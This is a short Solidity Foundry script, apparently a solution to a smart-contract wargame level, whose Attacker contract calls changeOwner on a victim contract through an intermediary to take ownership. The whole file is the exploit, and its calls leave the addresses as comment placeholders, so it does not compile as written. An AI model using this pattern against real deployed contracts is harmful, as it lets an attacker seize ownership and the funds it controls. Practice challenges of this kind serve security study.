// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    Attacker attacker;

    function run() public {
        vm.startBroadcast();
        attacker = new Attacker /* Your instance address */();
        attacker.attack /* here goes your address */();
        vm.stopBroadcast();
    }
}

contract Attacker {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack(address mypubAddress) public {
        (bool success, ) = victim.call(
            abi.encodeWithSignature("changeOwner(address)", mypubAddress)
        );
    }
}
